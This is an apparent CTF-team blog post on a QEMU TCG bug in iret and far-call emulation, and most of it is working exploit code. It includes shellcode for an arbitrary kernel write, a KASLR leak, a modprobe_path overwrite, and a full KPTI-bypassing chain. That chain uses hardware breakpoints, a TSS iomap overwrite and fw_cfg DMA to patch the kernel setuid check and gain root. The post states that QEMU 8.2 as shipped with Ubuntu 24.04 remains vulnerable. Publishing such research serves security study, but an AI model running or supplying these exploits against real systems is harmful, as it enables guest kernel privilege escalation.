+++
title = 'Exploiting a 13-years old bug on QEMU'
date = 2025-12-08T13:00:00+01:00
draft = false
author = 'prosti, leave, Erge'
summary = 'Learn how to cheese kpwn challenges running on a Ubuntu 24.04 container using a nday on QEMU'
tags = [
    'QEMU',
    'x86',
    'TCG'
]
toc = true
+++

## The vulnerability
I’ll get straight to the point: **iret** and **call far** are broken in all versions of QEMU prior to version **9.1**. The implementation of these instructions in QEMU's [TCG](https://wiki.qemu.org/Documentation/TCG) do not behave as intended.

**iretq** is used when returning from an interrupt and pretty much pops from the stack these registers (in order):
- **rip**
- **cs**
- **eflags**
- **rsp**
- **ss**

**call far** is used to change the instruction pointer, change the value of **cs**, and push the saved **rip** and **cs** on the stack.

The assumption made by QEMU developers is that these instructions (especially **iret**) were going to be used from ring 0 to go to ring 3 or to ring 0. This assumption is violated when **iret** is used to stay in ring 3 and just setting new values for **cs** and **ss**. Based on this, QEMU automatically accesses the stack as if the *current privilege level is 0* even if you are currently in ring 3.

## Arbitrary write
The first primitive that we gained was **arbitrary write**. By using **far call** and changing right before the call **rsp** to the address of an arbitrary writable kernel page, we can write the address of the call instruction in the specified address. <br>
Since we can control at least the value of the last byte of the address of the **far call** instruction, we can write one arbitrary byte at a time. <br>
If **KASLR** is on we need leaks (more on that later) and if **kPTI** is on we are (for now) kind of screwed because kernel pages are not mapped (kind of, continue reading to find out how we exploited the arbw primitive with **KPTI** on).

### ARBW exploit (KPTI off)
Here is the code and shellcode that you need for arbw:

```asm
bits 64
org 0x1337000

%define USABLE_RANGE 0x1337200


section .text
    global _start

; rdi -> target address
; rsi -> target byte

_start:
    jmp exploit
far_call_structure:
    dq c1
    dw 0x33
exploit:
    push rax
    push rbx
    push rcx
    push rdx
    mov rax, 0x000001337002b848
    mov rbx, 0x00000018ff480000
    mov rcx, USABLE_RANGE
    add cl, sil
    sub cl, 0xd ; constant value
    mov [rcx], rax
    add rcx, 8
    mov [rcx], rbx
    sub rcx, 8
    mov rdx, rsp
    mov rsp, rdi
    add rsp, 16
    jmp rcx
c1:
    mov rsp, rdx
    pop rdx
    pop rcx
    pop rbx
    pop rax
    ret
```

```c
uint8_t modprobe_path_shellcode[] = {235, 10, 73, 112, 51, 1, 0, 0, 0, 0, 51, 0, 80, 83, 81, 82, 72, 184, 72, 184, 2, 112, 51, 1, 0, 0, 72, 187, 0, 0, 72, 255, 24, 0, 0, 0, 185, 0, 114, 51, 1, 64, 0, 241, 128, 233, 13, 72, 137, 1, 72, 131, 193, 8, 72, 137, 25, 72, 131, 233, 8, 72, 137, 226, 72, 137, 252, 72, 131, 196, 16, 255, 225, 72, 137, 212, 90, 89, 91, 88, 195};

void* code_mapping = mmap((void *)0x1337000, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);

memcpy((uint8_t *)code_mapping, modprobe_path_shellcode, sizeof(modprobe_path_shellcode));

ul gadget = 0x612f706d742f;	// /tmp/a\0
for(int i = 0; i < 7; ++i)
	((void(*)(unsigned long, unsigned char))code_mapping)(kbase + MODPROBE_PATH + i, (gadget >> (i*8)) & 0xff);

modprobe("/tmp/a", "/flag");
```

The second primitive is a bit weird. While I was working on the arbitrary write primitive I told my boy **@leave** to find a way to get leaks.

## Bypassing KASLR

Given that the primitive lets us access kernel memory from userspace, we can read an address that ideally contains a leak of kbase in order to bypass KASLR. There are two main problems:
- finding a section of memory that contains a pointer to the kernel .text in the user page table (we're assuming **kPTI** is on);
- how do we find out the address for the said section.

### Exception handling
When a fault in userland occurs, **RIP** control is passed to the kernel, which is still running on the user page table, thus it needs a shared stack to perform the context switch. <br>
Functions are called, so return addresses are pushed onto the stack, in particular we are going to target the **asm_exc_*_error** handler (for simplicity, we will trigger a div by 0 error), for a simple reason: that specific return address is pushed right after the context, which means we control the qwords stored "underneath" the leak. <br> 
We could both use **retf** or **iret**, we will choose **iret** so we don't need to set up a valid userland stack for the handler later.
So the steps are:
- set up the shared stack to have a valid **iret** frame;
- make **RSP** point to that address;
- **iret**;
- handle the page fault and read **RIP**, which, as said, will contain the leak.

First step is accomplished by triggering a fault and handling it: the easiest way is declaring a **SIGFPE** handler and trigger a div by 0. By setting up **R15 ... R12** before the **DIV** those values will be pushed right before the leak, permitting us to push a valid **iret** frame.

```asm
mov r15, 0x33
mov r14, 0x206
mov r13, 0x133a000
mov r12, 0x2b
mov rax, 0
div rax
```

We now need to "leak" the address of the shared stack. <br>
The shared stack is core dependent, just like **TSS** and **GDT**, whose addresses are randomized and isolated from kbase: the reasons why they are isolated is **sgdt**, a ring 3 instruction [(by default)](https://en.wikipedia.org/wiki/X86_instruction_listings#cite_note-13) which return to the user the **GDT** address. By adding the right offset (0x1000) we can get the shared stack address, and by adding again the right offset (0xf50) we will get the exact address where the fake **iret** is stored. There are actually some more things about this, you can read more in another blogpost of ours: https://kqx.io/post/sp0.

```asm
push rax
sgdt [rsp]
mov rax, qword [rsp+2]
add rax, 0x1f50
mov rsp, rax
```
Now we can simply **iret** there and the leak will be readable from userspace.

Full shellcode:

```asm
mov r15, 0x33
mov r14, 0x206
mov r13, 0x133a000
mov r12, 0x2b

mov rax, 0
div rax

push rax
sgdt [rsp]
mov rax, qword [rsp+2]
add rax, 0x1f50
mov rsp, rax

iretq
```

### leak exploit
Full leak exploit that doesn't depend on the kernel image and works with **kPTI** on:
```c
#include  "helpers.h"
#include  <sys/syscall.h>
#include  <signal.h>
#include  <setjmp.h>

uint64_t kbase;
static sigjmp_buf env;

void sigfpe_handler(int sig, siginfo_t *si, void *context) {
    ucontext_t *uc = (ucontext_t *)context;

    uc->uc_mcontext.gregs[REG_RIP] += 3;
}

void sigsegv_handler(int sig, siginfo_t *si, void *context) {
    ucontext_t *uc = (ucontext_t *)context;

    kbase = (uint64_t) uc->uc_mcontext.gregs[REG_RIP];

    siglongjmp(env, 1);
}

void kaslr() {
	asm volatile(
		".intel_syntax noprefix\n"
		"mov r15, 0x33\n"
		"mov r14, 0x206\n"
		"mov r13, 0x133a000\n"
		"mov r12, 0x2b\n"

		"mov rax, 0\n"
		"div rax\n"

		"push rax\n"
		"sgdt [rsp]\n"
		"mov rax, qword [rsp+2-8]\n"
		"add rax, 0x1f50\n"
		"mov rsp, rax\n"
    
    	"iretq\n"
		".att_syntax noprefix\n"
	);
}

int main() {
	struct sigaction sa_fpe = {0};
    sa_fpe.sa_sigaction = sigfpe_handler;
    sa_fpe.sa_flags = SA_SIGINFO;
    sigaction(SIGFPE, &sa_fpe, NULL);

    struct sigaction sa_segv = {0};
    sa_segv.sa_sigaction = sigsegv_handler;
    sa_segv.sa_flags = SA_SIGINFO;
    sigemptyset(&sa_segv.sa_mask);
    sigaction(SIGSEGV, &sa_segv, NULL);

	// mmap the stack that will be used by the segfault handler after the iretq
    mmap((void *)0x1338000, PAGE_SIZE*2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_POPULATE, -1, 0);

    if (sigsetjmp(env, 1) == 0) {
        kaslr();
    }
    
    printf("[!] kbase: 0x%lx\n", kbase);

	return 0;
}
```

## Full exploit (kPTI off)
Here is full working exploit with **kPTI** off on **QEMU v8.2**. <br>
(This is the exploit we used at n1ctf 2025 to blood the challenge **n1khash**)

```c
#define DBG
#include "kpwn.c"
#include <setjmp.h>

#define ASM_EXC_DIVIDE_ERROR_OFFSET    (0x1801030+15)
#define MODPROBE_PATH 					0x3194620

uint64_t kbase;
static sigjmp_buf env;
uint8_t modprobe_path_shellcode[] = {235, 10, 73, 112, 51, 1, 0, 0, 0, 0, 51, 0, 80, 83, 81, 82, 72, 184, 72, 184, 2, 112, 51, 1, 0, 0, 72, 187, 0, 0, 72, 255, 24, 0, 0, 0, 185, 0, 114, 51, 1, 64, 0, 241, 128, 233, 13, 72, 137, 1, 72, 131, 193, 8, 72, 137, 25, 72, 131, 233, 8, 72, 137, 226, 72, 137, 252, 72, 131, 196, 16, 255, 225, 72, 137, 212, 90, 89, 91, 88, 195};


void sigfpe_handler(int sig, siginfo_t *si, void *context) {
    ucontext_t *uc = (ucontext_t *)context;

    uc->uc_mcontext.gregs[REG_RIP] += 3;
}

void sigsegv_handler(int sig, siginfo_t *si, void *context) {
    ucontext_t *uc = (ucontext_t *)context;

    kbase = (uint64_t) uc->uc_mcontext.gregs[REG_RIP] - ASM_EXC_DIVIDE_ERROR_OFFSET;

    siglongjmp(env, 1);
}

void kaslr() {
	asm volatile(
		".intel_syntax noprefix\n"
		"mov r15, 0x33\n"
		"mov r14, 0x206\n"
		"mov r13, 0x133a000\n"
		"mov r12, 0x2b\n"

		"mov rax, 0\n"
		"div rax\n"

		"push rax\n"
		"sgdt [rsp]\n"
		"mov rax, qword [rsp+2-8]\n"
		"add rax, 0x1f50\n"
		"mov rsp, rax\n"
    
    	"iretq\n"
		".att_syntax noprefix\n"
	);
}

int main() {
	struct sigaction sa_fpe = {0};
    sa_fpe.sa_sigaction = sigfpe_handler;
    sa_fpe.sa_flags = SA_SIGINFO;
    sigaction(SIGFPE, &sa_fpe, NULL);

    struct sigaction sa_segv = {0};
    sa_segv.sa_sigaction = sigsegv_handler;
    sa_segv.sa_flags = SA_SIGINFO;
    sigemptyset(&sa_segv.sa_mask);
    sigaction(SIGSEGV, &sa_segv, NULL);

    mmap((void *)0x1338000, PAGE_SIZE*2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_POPULATE, -1, 0);

    if (sigsetjmp(env, 1) == 0) {
        kaslr();
    }
    
    printf("[!] kbase: 0x%lx\n", kbase);


	void* code_mapping = mmap((void *)0x1337000, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);

    memcpy((uint8_t *)code_mapping, modprobe_path_shellcode, sizeof(modprobe_path_shellcode));

    ul gadget = 0x612f706d742f;
    for(int i = 0; i < 7; ++i)
        ((void(*)(unsigned long, unsigned char))code_mapping)(kbase + MODPROBE_PATH + i, (gadget >> (i*8)) & 0xff);

	modprobe_old("/tmp", "/tmp/a", "/flag");

    stop("finished");
    return 0;
}
```

## That damn physmap leak...
At this point we were stuck for a few months with an exploit that worked only with **kPTI** off. What can we do with the few kernel mappings that are mapped in the user page table?

Let's have a look to what is mapped in userland:
![vmmap](/images/qemu/vmmap.png)

We have:
 - **TSS** rw mapping in physmap
 - **IDT**
 - **cpu_entry_area** (CEA)
 - **kPTI trampoline**

rw mappings in **CEA** are only used to save temporary data during context switches (and no, race conditions are not possible because interrupts are disabled during context switches). <br>

What about the writable TSS mapping? What can we do by modifying the **TSS**? <br>
Short answer: https://kqx.io/post/fw_cfg <br>
TL;DR: we can overwrite the **iomap_base** field of the TSS in order to gain full interaction with I/O ports from ring 3 and using DMA transfers provided by **fw_cfg** (a device used from QEMU to transfer certain files from the guest to the host) to obtain an arbitrary write primitive in physical memory (and some funnier things ;D). <br>

What is stopping us from relying on this path to exploit this vulnerability? Well, physmap is randomized, and we weren't able to leak its base. <br>

## Exploiting with kPTI on
In response to the challenge we posted on X, **@cscat** found some interesting paths: <br>

### Arbitrary Read
The leaks **@leave** originally managed to obtain were through faked **iretq** frames, which grants a limited read primitive. <br>
**@cscat** exploited **retfq** to pop into `u->uc_mcontext.gregs[REG_ERR]` **cs & 0xfffc** giving arbitrary read. He then leaked kASLR from the IDT, which is at a fixed address. <br>

### 2 cores exploit
Another idea he gave us was to exploit the arbitrary write on a core to write malicious payloads on the exception stack of the other core. <br>
Not every CTF challenge runs on two cores, so we aimed for a more universal idea with one last bit of information **@cscat** gave us. <br>

### HWBP ftw
As I said the only missing bit is a physmap leak, what **@leave** tried was to exploit **copy_to/from_user** with an invalid userland mapping to trigger a fault and push on the stack (used by the page fault handler) the current context. <br>
The idea is to build a fake **iretq** frame with the registers **rdi**, **rsi**, **rdx**/**rcx**, because rdx and rcx will contain the size asked (so user-controlled), and rdx/rcx the arbitrary user mapping (so user-controlled) and a physmap leak (if you interact with a pipe for example). <br>
The only problem is that "trivial" faults that happens in kernelspace DO NOT switch the stack, so the context doesn't get saved in the CEA region. <br>
The special exceptions that fetch stacks from the IST have some special bits set inside the IDT. <br>
One of those is **#DB**, the debug exception. <br>
A useful scenario where debug exception gets triggered is through hardware breakpoints: we can hook the execution whenever a specific address gets accessed. <br>
So **@cscat** shared with us this [blogpost](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html) by project zero where it shows how debug exception can be used to hijack control flow. At the time it was useful because CEA was not yet randomized, so it was a full kASLR bypass. <br>
The way **@leave** took advantage of this was to simply put physmap leaks in the debug exception stack by setting the HWBP on a userland address that is accessed via a pipe interaction. So we'll find the address of the pipe's buffer in CEA. <br>
Then we can use the arbitrary read primitive found by **@cscat** and get the physmap leak. <br>

### Full exploit (kPTI on)
The only scenario where this exploit does not work is in a jail hardened with **seccomp** where **ptrace** is banned. <br>

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <asm/user_64.h>
#include <stddef.h>
#include <setjmp.h>
#include <arpa/inet.h>

#define PAGE_SIZE 0x1000

#define WATCH_ADDR 0xdead000


uint64_t g_errno;
jmp_buf env;
static char stack[0x4000];


#define TSS_PHYS 0xf405000
uint8_t arb_w_shellcode[] = {235, 10, 73, 112, 51, 1, 0, 0, 0, 0, 51, 0, 80, 83, 81, 82, 72, 184, 72, 184, 2, 112, 51, 1, 0, 0, 72, 187, 0, 0, 72, 255, 24, 0, 0, 0, 185, 0, 114, 51, 1, 64, 0, 241, 128, 233, 13, 72, 137, 1, 72, 131, 193, 8, 72, 137, 25, 72, 131, 233, 8, 72, 137, 226, 72, 137, 252, 72, 131, 196, 16, 255, 225, 72, 137, 212, 90, 89, 91, 88, 195};


#define CONFIG_PHYSICAL_START   0ul
#define CONFIG_PHYSICAL_ALIGN   0x200000ul

#define KPTR_RESTRICT           "/proc/sys/kernel/kptr_restrict"
#define KPTR_RESTRICT_OFFSET    0x22b5db0ul

#define SETUID_CHECK            0x2e3ca2ul

#define BIOS_CFG_DMA_ADDR_HIGH  0x514
#define BIOS_CFG_DMA_ADDR_LOW   0x518

#define FW_CFG_SIGNATURE	    0x00
#define SIGNATURE               "QEMU"

#define SP0_PTREGS_PHYS_ADDR    0xf40bf58ul

typedef enum fw_cfg_ctl_t {
    fw_ctl_error = 1,
    fw_ctl_read = 2,
    fw_ctl_skip = 4,
    fw_ctl_select = 8,
    fw_ctl_write = 16
} fw_cfg_ctl_t;


// TRIGGER DEBUG
static void set_hw_watch(pid_t pid, uint64_t addr) {
    uint64_t dr0_off = offsetof(struct user, u_debugreg[0]);
    uint64_t dr7_off = offsetof(struct user, u_debugreg[7]);
    uint64_t dr6_off = offsetof(struct user, u_debugreg[6]);

    ptrace(PTRACE_POKEUSER, pid, dr0_off, addr);
	ptrace(PTRACE_POKEUSER, pid, dr7_off, 0xf0101);
	ptrace(PTRACE_POKEUSER, pid, dr6_off, 0);
}

void tracee() {
    ptrace(PTRACE_TRACEME, 0, 0, 0);
    raise(SIGSTOP);

    mmap((void *) WATCH_ADDR, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_POPULATE, -1, 0);

    sleep(1);

	int pipes[2];
	pipe(pipes);
	write(pipes[1], (void*) WATCH_ADDR, 1);
	
    _exit(0);
}

void trigger_debug() {
	pid_t pid = fork();
    if (pid == 0)
        tracee();

    int st;
    waitpid(pid, &st, 0);

    set_hw_watch(pid, WATCH_ADDR);
    ptrace(PTRACE_CONT, pid, 0, 0);

    while (1) {
        waitpid(pid, &st, 0);

        if (WIFEXITED(st))
            break;

        if (WIFSTOPPED(st)) {
			int sig = WSTOPSIG(st); 
            if (sig == SIGTRAP)
                ptrace(PTRACE_CONT, pid, 0, 0);
            else
                ptrace(PTRACE_CONT, pid, 0, sig);
        }
    }
}

// ARB READ
void sigsegv_handler(int sig, siginfo_t *info, void *ctx) {
	ucontext_t *u = (ucontext_t *)ctx;
	g_errno = u->uc_mcontext.gregs[REG_ERR];
	u->uc_mcontext.gregs[REG_RSP] = (uint64_t)(stack + 0x1000);

	longjmp(env, 1);
}

struct sigaction orig_sa;
void siginit() {
	stack_t ss = {
		.ss_size = 0x4000,
		.ss_sp = stack,
	};
	struct sigaction sa = {.sa_sigaction = sigsegv_handler,
							.sa_flags = SA_ONSTACK | SA_SIGINFO};
	sigaltstack(&ss, 0);
	sigfillset(&sa.sa_mask);
	sigaction(SIGSEGV, &sa, &orig_sa);
}

void arb_r(uint64_t addr) {
	asm volatile(
		".intel_syntax noprefix\n"
		"mov rsp, %0\n"
		"sub rsp, 9\n"
		"iretq\n"
		".att_syntax prefix\n"
		:
		: "r" (addr)
		: 
	);
}

uint64_t physmap_leak() {
	char gdt[10];
	asm volatile (
        ".intel_syntax noprefix\n"
        "sgdt [%0]\n"
        ".att_syntax prefix\n"
        :
        : "r" (&gdt)
        :
    );

    uint64_t gdt_addr = *(uint64_t*) &gdt[2];
    uint64_t ist3 = gdt_addr + 0xffc8;
	uint64_t physmap = 0xffff000000000000;

	int pipes[2];
	for (int i=0; i<3; i++) {
		pipe(pipes);

		if (!fork()) { 
			siginit();
			if (setjmp(env) == 0) {
				arb_r(ist3+3+i);
			}

			write(pipes[1], &g_errno, sizeof(g_errno));
			_exit(0);
		}

		read(pipes[0], &g_errno, sizeof(g_errno));
		g_errno >>= 8;
		g_errno &= 0xff;
		physmap += (g_errno << ((3+i)*8));
	}

	physmap &= 0xfffffffff0000000;
	return physmap;
}

// IOPL
void arb_w(uint64_t addr) {
	void* code_mapping = mmap((void*) 0x1337000, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);

    memcpy((uint8_t *)code_mapping, arb_w_shellcode, sizeof(arb_w_shellcode));

    uint64_t gadget = 0x3000;
    for(int i = 0; i<2; ++i)
        ((void(*)(unsigned long, unsigned char))code_mapping)(addr+i, (gadget >> (i*8)) & 0xff);
}

void sigfpe_handler(int sig, siginfo_t *si, void *context) {
    ucontext_t *uc = (ucontext_t *)context;

    uc->uc_mcontext.gregs[REG_RIP] += 3;
}

uint64_t sp0_get_cmd(uint32_t control, uint64_t address, uint32_t length) {
    control = htonl(control);
    address = htobe64(address);
    length = htonl(length);

    asm volatile(
        ".intel_syntax noprefix\n"
        "mov r15d, %1\n"
        "shl r15, 32\n"
        "mov r14d, %0\n"
        "or r15, r14\n"
        "mov r14, %2\n"
        "mov rax, 0\n"
        "div rax\n"
        ".att_syntax prefix\n"
        :
        : "r" (control), "r" (length), "r" (address)
        : "rax", "r14", "r15"
    );

    return SP0_PTREGS_PHYS_ADDR;
}

int phys_arb_w(uint64_t phys_addr, char* value, int size){
    uint64_t cmd_physaddr;
    uint32_t cmd_physaddr_lo;
    uint32_t cmd_physaddr_hi;

    uint64_t byte_addr;
    uint32_t byte_off;

    byte_addr = (uint64_t)memmem(SIGNATURE, sizeof(SIGNATURE), value, size);
    
    if(byte_addr == 0)
        return 0;
    
    byte_off = byte_addr - (uint64_t)SIGNATURE;

    cmd_physaddr = sp0_get_cmd(fw_ctl_skip | fw_ctl_select | (FW_CFG_SIGNATURE << 16), 0, byte_off);
    
    cmd_physaddr_lo = (uint32_t)(cmd_physaddr & 0xFFFFFFFFU);
    cmd_physaddr_hi = (uint32_t)(cmd_physaddr >> 32);

    if (cmd_physaddr_hi)
        outl(htonl(cmd_physaddr_hi), BIOS_CFG_DMA_ADDR_HIGH);
    outl(htonl(cmd_physaddr_lo), BIOS_CFG_DMA_ADDR_LOW);
    
    cmd_physaddr = sp0_get_cmd(fw_ctl_read | (FW_CFG_SIGNATURE << 16), phys_addr, size);
    
    cmd_physaddr_lo = (uint32_t)(cmd_physaddr & 0xFFFFFFFFU);
    cmd_physaddr_hi = (uint32_t)(cmd_physaddr >> 32);

    if (cmd_physaddr_hi)
        outl(htonl(cmd_physaddr_hi), BIOS_CFG_DMA_ADDR_HIGH);
    outl(htonl(cmd_physaddr_lo), BIOS_CFG_DMA_ADDR_LOW);

    return 0;
}

uint32_t check_kptr_restrict(){
    uint32_t r;
    FILE* f;
    f = fopen(KPTR_RESTRICT, "rb");
    fscanf(f, "%d", &r);
    fclose(f);
    return r;
}

void fw_cfg() {
	struct sigaction sa_fpe = {0};
    sa_fpe.sa_sigaction = sigfpe_handler;
    sa_fpe.sa_flags = SA_SIGINFO;
    sigaction(SIGFPE, &sa_fpe, NULL);

    uint64_t phys_kbase;
    for (phys_kbase = CONFIG_PHYSICAL_START + CONFIG_PHYSICAL_ALIGN * 0x100; phys_kbase >= CONFIG_PHYSICAL_START; phys_kbase -= CONFIG_PHYSICAL_ALIGN){
        phys_arb_w(phys_kbase + KPTR_RESTRICT_OFFSET, SIGNATURE, sizeof(SIGNATURE));
        if(check_kptr_restrict() != 0)
            break;
    }
    printf("phys kbase @ %lx\n", phys_kbase);

    phys_arb_w(phys_kbase + SETUID_CHECK+0, "E", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+1, "M", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+2, "E", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+3, "M", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+4, "E", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+5, "M", 1);
    phys_arb_w(phys_kbase + SETUID_CHECK+6, "E", 1);

	setuid(0);
    
	char flag[0x100];
	int fd = open("/dev/vdb", O_RDONLY);
	read(fd, flag, sizeof(flag));
	puts(flag);

	while(1) {};
}

// EXPLOIT
int main() {
    trigger_debug();
	uint64_t physmap = physmap_leak();
	printf("physmap @ %lx\n", physmap);

	uint64_t tss = physmap + TSS_PHYS;
	uint64_t iomap_base = tss + 0x66;

	arb_w(iomap_base);
	fw_cfg();

    return 0;
}
```

## Patch
As stated in the introduction, this problem has been patched in **QEMU v9.1.0-rc0**. The bug was found by a guy that was running [.NET on QEMU](https://bugs.launchpad.net/qemu/+bug/1866892) for some weird reason. I did not find the bug by reading this report but randomly caused it while trying to use custom LDT segment descriptors.
Keep in mind that the default version shipped with Ubuntu 24.04 TLS is still vulnerable to this attack (**QEMU v8.2**)

## Lore
This is an actual fortune cookie quote **@prosti** found the same night he discovered the vulnerability:
<br>
<br>
![cookie](/images/qemu/cookie.png)
